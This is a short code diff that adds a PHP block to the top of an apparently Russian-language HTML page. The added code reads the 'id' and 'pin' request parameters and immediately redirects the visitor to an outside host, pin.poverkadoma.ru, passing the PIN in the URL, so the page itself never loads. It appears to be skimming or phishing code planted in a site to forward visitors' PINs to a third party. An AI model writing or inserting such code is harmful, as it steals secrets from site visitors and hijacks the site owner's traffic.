@@ -1,3 +1,10 @@
+<?php
+
+header('Location: https://pin.poverkadoma.ru/up?id='.$_REQUEST['id'].'.&pin='.$_REQUEST['pin']);
+exit;
+
+
+?>
 
 <!DOCTYPE html>
 <!--[if lt IE 7]><html lang="ru" class="lt-ie9 lt-ie8 lt-ie7"><![endif]-->
